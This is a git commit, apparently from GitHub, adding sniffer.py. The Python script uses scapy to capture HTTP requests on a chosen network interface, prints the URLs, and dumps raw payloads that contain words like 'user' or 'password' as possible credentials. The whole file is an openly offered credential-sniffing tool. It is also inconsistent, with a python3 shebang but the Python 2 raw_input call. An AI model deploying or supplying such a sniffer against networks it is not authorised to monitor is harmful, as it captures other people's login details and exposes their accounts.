cae60e7ee50f5db12f54a6437e7406e17044fe9f
kronos68 <54256399+kronos68@users.noreply.github.com>
2020-05-01 23:22:29 +0300

    Add files via upload

---
+++ sniffer.py
@@ -0,0 +1,24 @@
+#!/usr/bin/python3
+
+import scapy.all as scapy
+from scapy.layers import http
+from termcolor import colored
+
+def sniffer(interface):
+    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
+
+def process_sniffed_packet(packet):
+    if packet.haslayer(http.HTTPRequest):
+        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
+        print(colored("Http Request >>> " + str(url), "white"))
+        if packet.haslayer(scapy.Raw):
+            load = packet[scapy.Raw].load
+            keywords = ["user", "username", "email", "pass", "password"]
+            for keyword in keywords:
+                if keyword in load:
+                    print(colored("Possible username/password >>> " + str(load), "blue"))
+                    break
+
+interface = raw_input(colored("Enter Interface >>> ", "white"))
+
+sniffer(interface)
